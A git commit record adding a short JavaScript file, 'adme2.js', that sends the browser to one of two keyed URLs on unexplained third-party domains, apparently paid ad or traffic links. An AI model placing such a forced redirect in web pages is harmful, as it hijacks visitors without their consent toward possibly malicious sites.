db4514c7bc842d06033df15b4230e5150ae0194c
un13z <97453482+un13z@users.noreply.github.com>
2022-01-21 21:40:57 +0800

    Create adme2.js

---
+++ adme2.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'https://plumbingcurlproximity.com/hv884gq9?key=ddb9d0390b12ecd3ccebc8fc78a1413d',
+'https://backmerriment.com/dy9q80j1?key=78a1ee0612a84af4a12b0a4c1318d7b5'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
